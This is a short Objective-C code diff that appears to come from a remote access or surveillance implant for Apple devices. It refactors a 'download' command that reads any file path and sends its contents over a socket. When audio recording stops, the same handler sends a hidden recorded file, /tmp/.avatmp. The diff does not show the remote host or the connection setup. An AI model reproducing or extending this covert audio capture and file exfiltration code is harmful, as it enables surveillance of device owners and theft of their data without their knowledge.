@@ -123,7 +123,7 @@ int sockfd;
     }
     else if ([arg isEqualToString:@"stop"]) {
         if ([self stopAudio]) {
-            [self download:[[NSArray alloc] initWithObjects:@"download",@"/tmp/.avatmp", nil]];
+            [self download:@"/tmp/.avatmp"];
         }
         else {
             [self sendString:@"-1"];
@@ -394,25 +394,21 @@ int sockfd;
     }
 }
 
--(void)download:(NSArray *)args {
+-(void)download:(NSString *)arg {
     BOOL isdir;
-    NSString *filepath = @"";
-    if (args.count > 1) {
-        filepath = [self forgetFirst:args];
-    }
     
-    if ([fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
+    if ([fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
         if (isdir) {
-            [self sendString:@"-2"];
+            [self sendString:[NSString stringWithFormat:@"%@ is a directory",arg]];
         }
         else {
-            NSData *filedata = [fileManager contentsAtPath:filepath];
+            NSData *filedata = [fileManager contentsAtPath:arg];
             [self sendString:[NSString stringWithFormat:@"%lu",filedata.length]];
             [self sendFile:filedata];
         }
     }
     else {
-        [self sendString:@"-1"];
+        [self sendString:[NSString stringWithFormat:@"%@ not found",arg]];
     }
 }
 
